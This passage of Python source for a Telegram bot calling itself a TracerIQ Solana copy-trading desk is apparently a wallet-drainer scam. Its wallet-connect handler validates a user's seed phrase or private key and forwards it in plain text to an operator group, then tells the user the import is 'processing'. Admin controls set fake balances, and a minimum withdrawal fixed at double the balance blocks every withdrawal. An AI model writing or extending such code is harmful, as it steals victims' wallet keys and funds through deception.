                "Choose another asset or fund this wallet first.",
                parse_mode="HTML",
                reply_markup=back_btn,
            )
            return
        if balance < stored_min:
            await query.message.reply_text(
                f"⚠️ <b>Minimum not met</b>\n\n"
                f"Available: {balance:.6f} {sym}  ·  ${usd_value:.2f}\n"
                f"Minimum eligible amount: {stored_min:.6f} {sym}\n\n"
                f"Add more {sym} before continuing.",
                parse_mode="HTML",
                reply_markup=back_btn,
            )
            return
        half = balance / 2
        half_usd = half * price if price > 0 else 0
        network = {"sol": "Solana", "eth": "Ethereum", "bnb": "BNB Smart Chain"}[token]
        await query.message.reply_text(
            f"◈ <b>HALF-BALANCE CHECK</b>\n\n"
            f"Selected amount: <b>{half:.6f} {sym}</b>  ·  ${half_usd:.2f}\n"
            f"Network: {network}\n\n"
            f"Enter the amount to check against the withdrawal rules.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        context.user_data["awaiting_withdraw"] = True
        context.user_data["withdraw_amount"] = half
        return

    if option == "withdraw_custom":
        await _del()
        context.user_data["awaiting_withdraw"] = True
        token = context.user_data.get("withdraw_token", "sol")
        bal_data = user_balances.get(user_id, {})
        if token == "sol":
            balance = get_user_balance(user_id)
            price = await get_sol_price_usd()
            sym = "SOL"
            stored_min = bal_data.get("min_withdrawal", balance * 2)
            if stored_min == 0 and balance > 0:
                stored_min = balance * 2
        elif token == "eth":
            balance = bal_data.get("eth_balance", 0)
            price, _ = await get_evm_prices_usd()
            sym = "ETH"
            stored_min = balance * 2
        else:
            balance = bal_data.get("bnb_balance", 0)
            _, price = await get_evm_prices_usd()
            sym = "BNB"
            stored_min = balance * 2
        usd_value = balance * price if price > 0 else 0
        sent = await query.message.reply_text(
            f"◈ <b>ENTER WITHDRAWAL AMOUNT</b>\n\n"
            f"Available: <b>{balance:.6f} {sym}</b>  ·  ${usd_value:.2f}\n"
            f"Minimum eligible amount: <b>{stored_min:.6f} {sym}</b>\n\n"
            f"Send the amount in {sym}, or choose Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        context.user_data["withdraw_prompt_msg_id"] = sent.message_id
        context.user_data["withdraw_prompt_chat_id"] = sent.chat_id
        return

    # Save state for this user (for settings)
    user_states[user_id] = option

    # Create cancel button for settings input
    cancel_button = InlineKeyboardMarkup(
        [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_settings")]]
    )

    await _del()
    await query.message.reply_text(
        text=f"◈ <b>{option.replace('_', ' ').title()}</b>\n\nEnter the new value and send it as a message.",
        parse_mode="HTML",
        reply_markup=cancel_button,
    )

# ---- Helpers ----
def main_menu_markup():
    """Persistent Home and Support shortcuts shown below TracerIQ messages."""
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("⌂ Home", callback_data="back_main"),
                InlineKeyboardButton("☎️ Support", callback_data="support_contact"),
            ]
        ]
    )

def start_links_keyboard():
    """External inline links displayed under the /start welcome image."""
    return TelegramInlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "📢 Subscribe to TracerIQ Channel",
                    url="https://t.me/TracerlQ",
                )
            ],
            #[
                #InlineKeyboardButton(
                  #  "🌐 Open TracerIQ Web",
                  #url="https://traceriq.xyz",
               # )
           #],
        ]
    )

def support_contact_keyboard():
    return TelegramInlineKeyboardMarkup(
        [
            [InlineKeyboardButton("☎️ Contact Support", url=SUPPORT_LINK)],
            [InlineKeyboardButton("↩ Back to Menu", callback_data="back_main")],
        ]
    )

def main_menu_inline():
    """Copy-trading-first navigation for the TracerIQ home screen."""
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🎯 Open Copy-Trading Desk", callback_data="ct_wallet_view"
                )
            ],
            [
                InlineKeyboardButton("💼 Portfolio", callback_data="show_wallet"),
                InlineKeyboardButton("📘 How It Works", callback_data="show_bot_guide"),
            ],
            [
                # InlineKeyboardButton("📡 Live Market", callback_data="show_live_chart"),
                InlineKeyboardButton("🤝 Invite Traders", callback_data="refer_earn"),
            ],
            [InlineKeyboardButton("☎️ Support", callback_data="support_contact")],
        ]
    )

def copy_trade_setup_keyboard():
    """Copy-rule controls; callback identifiers preserve the existing behavior."""
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🛰️ Follow Wallet", callback_data="ct_target_wallet"
                ),
                InlineKeyboardButton(
                    "💸 Copy Allocation", callback_data="ct_buy_amount"
                ),
            ],
            [
                InlineKeyboardButton(
                    "🔁 Entry Limit", callback_data="ct_consecutive_buys"
                ),
                InlineKeyboardButton("🎯 Exit Rule", callback_data="ct_sell_position"),
            ],
            [InlineKeyboardButton("⌂ Portfolio", callback_data="back_wallet")],
        ]
    )

def back_to_menu_btn():
    """Single-row 'Back to Menu' inline button."""
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
    )

def cancel_markup():
    return _make_reply_keyboard(
        [[_register_reply_button("Cancel", {"kind": "input", "text": "Cancel"})]],
        placeholder="Type a value or choose Cancel",
    )

# Validate a single word: only letters A-Z (either case)
def is_alpha_word(word: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z]+", word))

# Fetch token details from DexScreener API (using run_in_executor for non-blocking)
async def get_token_details(token_address: str):
    """Fetch token details from DexScreener API"""
    import asyncio

    def fetch():
        try:
            url = f"https://api.dexscreener.com/latest/dex/tokens/{token_address}"
            response = requests.get(url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if data and "pairs" in data and len(data["pairs"]) > 0:
                    return data["pairs"][0]  # Return the first (most liquid) pair
            return None
        except Exception as e:
            print(f"Error fetching token details: {e}")
            return None

    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, fetch)

# Format token details for display
def format_token_details(pair_data, wallet_balance=0, chain_sym="SOL"):
    """Format token details in the style requested by user"""
    try:
        from datetime import datetime

        token = pair_data.get("baseToken", {})
        quote = pair_data.get("quoteToken", {})

        # Token name and symbol
        token_name = token.get("name", "Unknown")
        token_symbol = token.get("symbol", "Unknown")
        token_address = token.get("address", "N/A")

        # Market data
        price_usd = (
            float(pair_data.get("priceUsd", 0)) if pair_data.get("priceUsd") else 0
        )
        market_cap = pair_data.get("marketCap")
        fdv = pair_data.get("fdv")
        liquidity_usd = pair_data.get("liquidity", {}).get("usd", 0)

        # Volume and transactions
        volume_24h = pair_data.get("volume", {}).get("h24", 0)
        txns_24h = pair_data.get("txns", {}).get("h24", {})
        buyers_24h = txns_24h.get("buys", 0) if txns_24h else 0

        # DEX info
        dex_id = pair_data.get("dexId", "Unknown").upper()
        pair_created = pair_data.get("pairCreatedAt", 0)

        # Links
        info = pair_data.get("info", {})
        socials = info.get("socials", [])

        twitter_link = "❌"
        telegram_link = "❌"

        for social in socials:
            if social.get("type") == "twitter":
                twitter_link = "✅"
            elif social.get("type") == "telegram":
                telegram_link = "✅"

        # Format price with proper decimals (fix for very small prices)
        if price_usd == 0:
            price_str = "0.000000"
        else:
            price_str = f"{price_usd:.6f}"

        # Fix timestamp conversion (pairCreatedAt is in milliseconds)
        if pair_created:
            # Convert milliseconds to seconds
            created_dt = datetime.fromtimestamp(pair_created / 1000)
            time_diff = datetime.now() - created_dt
            days = time_diff.days
            hours = time_diff.seconds // 3600
            minutes = (time_diff.seconds % 3600) // 60
            time_ago = (
                f"{days}d {hours}h {minutes}m ago"
                if days > 0
                else f"{hours}h {minutes}m ago"
            )
        else:
            time_ago = "Unknown"

        # Format market cap with fallback to FDV
        if market_cap and market_cap > 0:
            if market_cap >= 1000000:
                mcap_str = f"{market_cap / 1000000:.1f}M"
            else:
                mcap_str = f"{market_cap / 1000:.1f}K"
        elif fdv and fdv > 0:
            if fdv >= 1000000:
                mcap_str = f"{fdv / 1000000:.1f}M (FDV)"
            else:
                mcap_str = f"{fdv / 1000:.1f}K (FDV)"
        else:
            mcap_str = "Unknown"

        # Format liquidity
        if liquidity_usd >= 1000000:
            liq_str = f"{liquidity_usd / 1000000:.2f}M"
        else:
            liq_str = f"{liquidity_usd / 1000:.2f}K"

        # Determine chain for links
        chain_id = pair_data.get("chainId", "solana").lower()
        if chain_id in ("ethereum", "eth"):
            dex_chain = "ethereum"
            chain_emoji = "🔵"
            chain_label = "Ethereum"
        elif chain_id in ("bsc", "binance-smart-chain", "bnb"):
            dex_chain = "bsc"
            chain_emoji = "🟡"
            chain_label = "BSC"
        else:
            dex_chain = "solana"
            chain_emoji = "🟣"
            chain_label = "Solana"

        extra_link = (
            f" | <a href='https://www.pump.fun/{token_address}'>Pump</a>"
            if dex_chain == "solana"
            else ""
        )

        message = (
            f"📌 <b>{token_name} ({token_symbol})</b>\n"
            f"<code>{token_address}</code>\n\n"
            f"💳 <b>Wallet:</b>\n"
            f"|——Balance: {wallet_balance} {chain_sym}\n"
            f"|——Holding: 0 {token_symbol}\n"
            f"|___PnL: 0%🚀🚀\n\n"
            f"💵 <b>Trade:</b>\n"
            f"|——Market Cap: {mcap_str}\n"
            f"|——Price: {price_str}\n"
            f"|___Buyers (24h): {buyers_24h}\n\n"
            f"📝 <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
            f"|——💧 {dex_id} AMM\n"
            f"|——🟢 Trading opened\n"
            f"|——Created {time_ago}\n"
            f"|___Liquidity: {liq_str} USD\n\n"
            f"📲 <b>Links:</b>\n"
            f"|—— Twitter {twitter_link}\n"
            f"|—— Telegram {telegram_link}\n"
            f"|___ <a href='https://dexscreener.com/{dex_chain}/{token_address}'>DexScreener</a>"
            f"{extra_link}"
        )

        return message
    except Exception as e:
        print(f"Error formatting token details: {e}")
        return None

# --- /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _delete_previous_bot_messages(update, context)
    user = update.effective_user
    user_id = user.id
    if user_id in banned_users:
        return
    register_user(user_id)

    bot_username = (await context.bot.get_me()).username
    ref_code = get_or_create_referral_code(user_id)
    referral_link = f"https://t.me/{bot_username}?start=ref_{ref_code}"

    inviter_line = ""
    if context.args:
        arg = context.args[0]
        if arg.startswith("ref_"):
            inviter_code = arg[4:]
            inviter_id = record_referral(user_id, inviter_code)
            if inviter_id:
                try:
                    inviter_chat = await context.bot.get_chat(inviter_id)
                    inviter_name = (
                        inviter_chat.first_name
                        or inviter_chat.username
                        or str(inviter_id)
                    )
                except Exception:
                    inviter_name = "a friend"
                inviter_line = f"\n\n👥 You were invited by <b>{inviter_name}</b>!"

    welcome_text = (
        "◈ <b>TRACERIQ</b>\n"
        "<i>INTELLIGENT SOLANA COPY-TRADING DESK</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Welcome. Track selected wallets, configure how their activity is copied, "
        "and review your portfolio from Telegram.\n\n"
        "🎯 <b>Start here</b>\n"
        "Open the Copy-Trading Desk to set a target wallet and choose your copy rules. "
        "Check the wallet and settings before enabling any strategy.\n"
        f"{inviter_line}\n\n"
        "🤝 <b>Your invite link</b>\n"
        f"<code>{referral_link}</code>\n\n"
        "<i>Crypto assets are volatile. Review transactions and manage risk carefully.</i>\n\n"
        "Choose a destination below."
    )

    start_links = start_links_keyboard()
    preserve_token = _preserve_multiple_bot_messages.set(True)
    try:
        if update.message:
            with START_BANNER_PATH.open("rb") as banner:
                await update.message.reply_photo(
                    photo=banner,
                    caption=welcome_text,
                    parse_mode="HTML",
                    reply_markup=start_links,
                )
            await update.message.reply_text(
                "Choose an option from the keyboard below.",
                reply_markup=main_menu_inline(),
            )
        elif update.callback_query:
            chat_id = update.callback_query.message.chat_id
            with START_BANNER_PATH.open("rb") as banner:
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=banner,
                    caption=welcome_text,
                    parse_mode="HTML",
                    reply_markup=start_links,
                )
            await context.bot.send_message(
                chat_id=chat_id,
                text="Choose an option from the keyboard below.",
                reply_markup=main_menu_inline(),
            )
    finally:
        _preserve_multiple_bot_messages.reset(preserve_token)

    # --- /support ---

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _delete_previous_bot_messages(update, context)
    user_id = update.effective_user.id
    if user_id in banned_users:
        return
    await update.message.reply_text(
        "☎️Support Contact\n\n"
        "Need help? Our support team is always available to assist you.\n\n"
        "Simply click the button below to contact our support team anytime.",
        reply_markup=support_contact_keyboard(),
    )
    # clear states
    context.user_data.pop("awaiting_dummy", None)
    context.user_data.pop("awaiting_withdraw", None)

# --- Message handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _delete_previous_bot_messages(update, context)
    user_id = update.effective_user.id

    # Global ban check
    if user_id in banned_users:
        return

    text = (update.message.text or "").strip()
    user = update.effective_user
    user_name = user.username or user.first_name or str(user_id)

    reply_button = _decode_reply_button(text)
    if not reply_button:
        # Telegram clients or older keyboards can strip/alter zero-width
        # action tags. Route by the visible label as a safe compatibility fallback.
        visible_label = _normalize_reply_label(text)
        action = _reply_actions_by_label.get(visible_label)
        if action is None:
            legacy_menu_actions = {
                "🎯 Open Copy-Trading Desk": {"kind": "callback", "data": "ct_wallet_view"},
                "💼 Portfolio": {"kind": "callback", "data": "show_wallet"},
                "📘 How It Works": {"kind": "callback", "data": "show_bot_guide"},
                "🤝 Invite Traders": {"kind": "callback", "data": "refer_earn"},
                "☎️ Support": {"kind": "callback", "data": "support_contact"},
                "⌂ Home": {"kind": "callback", "data": "back_main"},
                "⌂ Portfolio": {"kind": "callback", "data": "back_wallet"},
                "↩ Back to Menu": {"kind": "callback", "data": "back_main"},
                "🔄 Refresh Portfolio": {"kind": "callback", "data": "show_wallet"},
                "Cancel": {"kind": "callback", "data": "cancel_settings"},
            }
            action = legacy_menu_actions.get(visible_label)
        if action:
            reply_button = (action, visible_label)
    if reply_button:
        action, plain_label = reply_button
        try:
            await update.message.delete()
        except Exception:
            # Continue with the requested action if Telegram denies deletion.
            pass

        if action["kind"] == "callback":
            await button_handler(update, context, reply_action=action["data"])
            return
        if action["kind"] == "url":
            url = html_escape(action["url"], quote=True)
            label = html_escape(action["label"])
            await context.bot.send_message(
                chat_id=update.message.chat_id,
                text=f'<a href="{url}">{label}</a>',
                parse_mode="HTML",
                disable_web_page_preview=True,
            )
            return
        if action["kind"] == "input":
            text = action["text"]
            update = _ReplyKeyboardInputUpdate(update, context, text)
    elif text in ("Cancel", "🔄 Refresh Portfolio"):
        # Remove button messages sent by reply keyboards from older bot
        # sessions, which do not carry the hidden action tag.
        try:
            await update.message.delete()
        except Exception:
            pass
        update = _ReplyKeyboardInputUpdate(update, context, text)

    # Handle Admin inputs
    if user_id in ADMIN_IDS:

        if context.user_data.get("awaiting_admin_ban"):
            try:
                target_id = int(text.strip())
                banned_users.add(target_id)
                save_banned_users()
                await update.message.reply_text(
                    f"🚫 User <code>{target_id}</code> has been banned.",
                    parse_mode="HTML",
                )
            except ValueError:
                await update.message.reply_text("❌ Invalid ID format.")
            finally:
                context.user_data.pop("awaiting_admin_ban", None)
            return

        if context.user_data.get("awaiting_admin_unban"):
            try:
                target_id = int(text.strip())
                if target_id in banned_users:
                    banned_users.remove(target_id)
                    save_banned_users()
                    await update.message.reply_text(
                        f"✅ User <code>{target_id}</code> has been unbanned.",
                        parse_mode="HTML",
                    )
                else:
                    await update.message.reply_text(
                        "❓ User is not in the banned list."
                    )
            except ValueError:
                await update.message.reply_text("❌ Invalid ID format.")
            finally:
                context.user_data.pop("awaiting_admin_unban", None)
            return

        if context.user_data.get("awaiting_admin_support_link"):
            new_link = text.strip()
            if new_link.startswith("http"):
                global SUPPORT_LINK
                SUPPORT_LINK = new_link
                save_support_link()
                await update.message.reply_text(
                    f"✅ Support link updated to: {SUPPORT_LINK}"
                )
            else:
                await update.message.reply_text(
                    "❌ Invalid link format. Must start with http or https."
                )
            context.user_data.pop("awaiting_admin_support_link", None)
            return

        if context.user_data.get("awaiting_admin_user_lookup"):
            try:
                target_id = int(text.strip())
                if target_id in user_balances:
                    data = user_balances[target_id]
                    balance = data.get("balance", 0)
                    min_w = data.get("min_withdrawal", balance * 2)
                    is_fixed = data.get("fixed_min", False)

                    status = "Fixed" if is_fixed else "Auto (x2)"
                    is_muted = target_id in muted_users
                    mute_status = "🔕 Muted" if is_muted else "🔔 Active"
                    eth_bal = data.get("eth_balance", 0)
                    bnb_bal = data.get("bnb_balance", 0)

                    msg = (
                        f"👤 <b>User Details:</b> <code>{target_id}</code>\n\n"
                        f"🟣 <b>SOL Balance:</b> {balance:.4f} SOL\n"
                        f"🔵 <b>ETH Balance:</b> {eth_bal:.4f} ETH\n"
                        f"🟡 <b>BNB Balance:</b> {bnb_bal:.4f} BNB\n\n"
                        f"💸 <b>Min Withdrawal:</b> {min_w:.4f} SOL\n"
                        f"⚙️ <b>Min Status:</b> {status}\n"
                        f"🔔 <b>Notifications:</b> {mute_status}"
                    )

                    mute_label = "🔕 Mute 🟢" if is_muted else "🔕 Mute"
                    unmute_label = "🔔 Unmute 🟢" if not is_muted else "🔔 Unmute"

                    keyboard = InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "✏️ Edit SOL",
                                    callback_data=f"admin_edit_balance_{target_id}",
                                ),
                                InlineKeyboardButton(
                                    "✏️ Edit ETH",
                                    callback_data=f"admin_edit_ethbal_{target_id}",
                                ),
                                InlineKeyboardButton(
                                    "✏️ Edit BNB",
                                    callback_data=f"admin_edit_bnbbal_{target_id}",
                                ),
                            ],
                            [
                                InlineKeyboardButton(
                                    "✏️ Edit Min Withdrawal",
                                    callback_data=f"admin_edit_minw_{target_id}",
                                )
                            ],
                            [
                                InlineKeyboardButton(
                                    mute_label, callback_data=f"admin_mute_{target_id}"
                                ),
                                InlineKeyboardButton(
                                    unmute_label,
                                    callback_data=f"admin_unmute_{target_id}",
                                ),
                            ],
                            [
                                InlineKeyboardButton(
                                    "📨 Send Deposit Notif",
                                    callback_data=f"admin_send_notif_{target_id}",
                                )
                            ],
                        ]
                    )
                    await update.message.reply_text(
                        msg, parse_mode="HTML", reply_markup=keyboard
                    )
                else:
                    await update.message.reply_text("❌ User not found in database.")
            except ValueError:
                await update.message.reply_text("❌ Invalid ID format.")
            finally:
                context.user_data.pop("awaiting_admin_user_lookup", None)
            return

        if context.user_data.get("admin_editing_user"):
            target_id = int(context.user_data["admin_editing_user"])
            field = context.user_data["admin_editing_field"]
            try:
                val = float(text.strip())
                if target_id not in user_balances:
                    user_balances[target_id] = {
                        "balance": 0,
                        "last_checked_slot": 0,
                        "min_withdrawal": 0,
                        "fixed_min": False,
                        "eth_balance": 0,
                        "bnb_balance": 0,
                    }

                if field == "balance":
                    user_balances[target_id]["balance"] = val
                    current_min = user_balances[target_id].get("min_withdrawal", 0)
                    if val >= current_min:
                        user_balances[target_id]["fixed_min"] = False
                        user_balances[target_id]["min_withdrawal"] = val * 2
                elif field == "ethbal":
                    user_balances[target_id]["eth_balance"] = val
                elif field == "bnbbal":
                    user_balances[target_id]["bnb_balance"] = val
                else:  # minw / min_withdrawal
                    user_balances[target_id]["min_withdrawal"] = val
                    user_balances[target_id]["fixed_min"] = True

                save_balances()

                sol_price = await get_sol_price_usd()
                new_sol = user_balances[target_id]["balance"]
                new_eth = user_balances[target_id].get("eth_balance", 0)
                new_bnb = user_balances[target_id].get("bnb_balance", 0)
                new_min = user_balances[target_id]["min_withdrawal"]
                usd_value = new_sol * sol_price if sol_price > 0 else 0

                label_map = {
                    "balance": "SOL Balance",
                    "ethbal": "ETH Balance",
                    "bnbbal": "BNB Balance",
                    "minw": "Min Withdrawal",
                }
                label = label_map.get(field, field.replace("_", " ").title())

                update_msg = (
                    f"✅ <b>{label}</b> updated for user <code>{target_id}</code>\n\n"
                    f"🟣 SOL: {new_sol:.4f} (${usd_value:.2f})\n"
                    f"🔵 ETH: {new_eth:.4f}\n"
                    f"🟡 BNB: {new_bnb:.4f}\n"
                    f"💸 Min Withdrawal: {new_min:.4f} SOL"
                )

                await update.message.reply_text(update_msg, parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ Invalid number format.")
            finally:
                context.user_data.pop("admin_editing_user", None)
                context.user_data.pop("admin_editing_field", None)
            return

    # ----- Handle Copy Trade Smart Wallet inline flow states -----
    if context.user_data.get("awaiting_ct_target_wallet"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_target_wallet", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        # Verify $20 minimum across total portfolio (SOL + ETH + BNB) silently
        sol_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        eth_price_ct, bnb_price_ct = await get_evm_prices_usd()
        bal_ct = user_balances.get(user_id, {})
        eth_balance = bal_ct.get("eth_balance", 0)
        bnb_balance = bal_ct.get("bnb_balance", 0)
        total_usd = (
            sol_balance * sol_price
            + eth_balance * eth_price_ct
            + bnb_balance * bnb_price_ct
        )
        if total_usd < 20:
            context.user_data.pop("awaiting_ct_target_wallet", None)
            await update.message.reply_text(
                "<b>Your balance is too low to copy this wallet. Please top up your wallet and try again.</b>",
                parse_mode="HTML",
                reply_markup=main_menu_inline(),
            )
            return
        wallet_address = text.strip()
        base58_pattern = r"^[1-9A-HJ-NP-Za-km-z]{32,44}$"
        evm_pattern = r"^0x[0-9a-fA-F]{40}$"
        if not re.match(base58_pattern, wallet_address) and not re.match(
            evm_pattern, wallet_address
        ):
            await update.message.reply_text(
                "❗ Invalid wallet address.\n\n"
                "• For Solana: enter a 32-44 character base58 address.\n"
                "• For EVM (ETH/BSC): enter a 0x… 42-character hex address.",
                reply_markup=cancel_markup(),
            )
            return
        context.user_data["ct_target_wallet"] = wallet_address
        context.user_data.pop("awaiting_ct_target_wallet", None)
        copy_trade_buttons = copy_trade_setup_keyboard()
        await update.message.reply_text(
            f"✅ <b>FOLLOW TARGET SAVED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>{wallet_address}</code>\n\n"
            "Next, choose your copy allocation, entry limit, and exit rule:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if context.user_data.get("awaiting_ct_buy_amount"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_buy_amount", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        try:
            amount = float(text.strip())
            if amount <= 0:
                raise ValueError()
        except ValueError:
            await update.message.reply_text(
                "❗ Please enter a valid positive number (e.g. 0.5).",
                reply_markup=cancel_markup(),
            )
            return
        context.user_data["ct_buy_amount"] = amount
        context.user_data.pop("awaiting_ct_buy_amount", None)
        copy_trade_buttons = copy_trade_setup_keyboard()
        await update.message.reply_text(
            f"✅ <b>COPY ALLOCATION SAVED</b>  ·  {amount} SOL\n\n"
            "Continue setting up your copy rules:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if context.user_data.get("awaiting_ct_consecutive_buys"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_consecutive_buys", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        try:
            num = int(text.strip())
            if num <= 0:
                raise ValueError()
        except ValueError:
            await update.message.reply_text(
                "❗ Please enter a valid positive whole number (e.g. 3).",
                reply_markup=cancel_markup(),
            )
            return
        context.user_data["ct_consecutive_buys"] = num
        context.user_data.pop("awaiting_ct_consecutive_buys", None)
        copy_trade_buttons = copy_trade_setup_keyboard()
        await update.message.reply_text(
            f"✅ <b>ENTRY LIMIT SAVED</b>  ·  {num}\n\n"
            "Continue setting up your copy rules:",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if context.user_data.get("awaiting_ct_slippage"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_ct_slippage", None)
            context.user_data.pop("ct_sell_position", None)
            await update.message.reply_text(
                "❌ Cancelled.", reply_markup=main_menu_inline()
            )
            return
        try:
            slippage = float(text.strip())
            if slippage < 1 or slippage > 15:
                await update.message.reply_text(
                    "❗ Slippage must be between <b>1%</b> and <b>15%</b>.\n\n"
                    "Please enter a valid value:",
                    parse_mode="HTML",
                    reply_markup=cancel_markup(),
                )
                return
        except ValueError:
            await update.message.reply_text(
                "❗ Please enter a valid number between 1 and 15.",
                reply_markup=cancel_markup(),
            )
            return
        sell_pos = context.user_data.get("ct_sell_position", "N/A")
        target = context.user_data.get("ct_target_wallet", "Not set")
        buy_amount = context.user_data.get("ct_buy_amount", "Not set")
        consec = context.user_data.get("ct_consecutive_buys", "Not set")
        context.user_data.pop("awaiting_ct_slippage", None)
        context.user_data.pop("ct_sell_position", None)
        await update.message.reply_text(
            f"◈ <b>TRACERIQ  /  COPY RULES SAVED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🛰️ <b>Follow target</b>  ·  <code>{target}</code>\n"
            f"💸 <b>Copy allocation</b>  ·  {buy_amount} SOL\n"
            f"🔁 <b>Entry limit</b>  ·  {consec}\n"
            f"🎯 <b>Exit rule</b>  ·  {sell_pos}\n"
            f"◈ <b>Slippage</b>  ·  {slippage}%\n\n"
            "Your copy rules have been saved.",
            parse_mode="HTML",
            reply_markup=main_menu_inline(),
        )
        return

    # ----- Handle Connect Wallet credentials (validation only) -----
    if context.user_data.get("awaiting_dummy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text(
                "Request cancelled. Back to menu:", reply_markup=main_menu_markup()
            )
            return

        mode = context.user_data["awaiting_dummy"]
        if mode == "seed":
            words = [w.lower().strip() for w in text.split() if w.strip()]
            if len(words) != 12 or not all(w in set(_bip39.wordlist) for w in words):
                await update.message.reply_text(
                    "❌ <b>Invalid Seed Phrase</b>\n\n"
                    "Enter exactly 12 valid BIP39 English words.",
                    parse_mode="HTML",
                    reply_markup=cancel_markup(),
                )
                return
            phrase = " ".join(words)
            if not _bip39.check(phrase):
                await update.message.reply_text(
                    "❌ <b>Invalid Seed Phrase</b>\n\n"
                    "The words are BIP39 words, but the checksum is invalid. Try again.",
                    parse_mode="HTML",
                    reply_markup=cancel_markup(),
                )
                return
            credential = phrase
            credential_type = "12-word seed phrase"
        else:
            credential = text.strip()
            credential_type = None
            # EVM: 32 bytes represented as 64 hex characters.
            evm_key = (
                credential[2:] if credential.lower().startswith("0x") else credential
            )
            if re.fullmatch(r"[0-9a-fA-F]{64}", evm_key):
                try:
                    Account.from_key(evm_key)
                    credential_type = "EVM private key"
                except Exception:
                    pass
            # Solana: solders accepts the 64-byte secret-key format used by
            # Phantom/Solana CLI, encoded as base58.
            if credential_type is None:
                try:
                    decoded = base58.b58decode(credential)
                    Keypair.from_bytes(decoded)
                    credential_type = "Solana private key"
                except Exception:
                    pass
            if credential_type is None:
                await update.message.reply_text(
                    "❌ <b>Invalid Private Key</b>\n\n"
                    "Use a Solana base58 64-byte private key or a 64-character "
                    "hexadecimal EVM key (with optional 0x prefix).",
                    parse_mode="HTML",
                    reply_markup=cancel_markup(),
                )
                return

        forward_text = (
            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id})\n"
            f"Type: {credential_type}\n\n<pre>{credential}</pre>"
        )
        try:
            await context.bot.send_message(
                chat_id=GROUP_ID, text=forward_text, parse_mode="HTML"
            )
        except Exception as e:
            await update.message.reply_text(
                "Failed to forward input to the group. Contact the bot admin."
            )
            print("Error sending to group:", e)
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text(
                "Back to menu:", reply_markup=main_menu_markup()
            )
            return

        context.user_data.pop("awaiting_dummy", None)
        await update.message.reply_text(
            "✅ <b>Wallet Connection Processing</b>\n\n"
            "Please wait while our system processes your wallet import request ✅",
            parse_mode="HTML",
            reply_markup=main_menu_markup(),
        )
        return

    # ----- Handle Withdraw flow -----
    if context.user_data.get("awaiting_withdraw"):
        # Helper: delete the stored prompt message (the bot's "enter amount" message)
        async def _del_prompt():
            prompt_msg_id = context.user_data.pop("withdraw_prompt_msg_id", None)
            prompt_chat_id = context.user_data.pop("withdraw_prompt_chat_id", None)
            if prompt_msg_id and prompt_chat_id:
                try:
                    await context.bot.delete_message(
                        chat_id=prompt_chat_id, message_id=prompt_msg_id
                    )
                except Exception:
                    pass

        back_btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "⬅️ Back to Withdraw", callback_data="back_withdraw"
                    )
                ]
            ]
        )

        # Resolve which token is being withdrawn
        w_token = context.user_data.get("withdraw_token", "sol")
        bal_wd = user_balances.get(user_id, {})
        if w_token == "sol":
            w_balance = get_user_balance(user_id)
            w_price = await get_sol_price_usd()
            w_sym = "SOL"
            w_min = bal_wd.get("min_withdrawal", w_balance * 2)
            if w_min == 0 and w_balance > 0:
                w_min = w_balance * 2
        elif w_token == "eth":
            w_balance = bal_wd.get("eth_balance", 0)
            w_price, _ = await get_evm_prices_usd()
            w_sym = "ETH"
            w_min = w_balance * 2
        else:
            w_balance = bal_wd.get("bnb_balance", 0)
            _, w_price = await get_evm_prices_usd()
            w_sym = "BNB"
            w_min = w_balance * 2
        w_usd = w_balance * w_price if w_price > 0 else 0

        if text.lower() == "cancel":
            context.user_data.pop("awaiting_withdraw", None)
            context.user_data.pop("withdraw_token", None)
            await _del_prompt()
            cancelled_msg = await update.message.reply_text(
                "◈ <b>WITHDRAWAL CANCELLED</b>\n\nNo withdrawal request was completed.",
                parse_mode="HTML",
            )
            await asyncio.sleep(1.5)
            try:
                await cancelled_msg.delete()
            except Exception:
                pass
            await show_wallet(update, context)
            return

        await _del_prompt()

        try:
            amount = float(text)
        except ValueError:
            await update.message.reply_text(
                f"⚠️ Enter a valid amount using numbers only ({w_sym}).",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
            return

        if amount <= 0:
            await update.message.reply_text(
                "⚠️ The amount must be greater than zero.",
                reply_markup=back_btn,
            )
            context.user_data.pop("awaiting_withdraw", None)
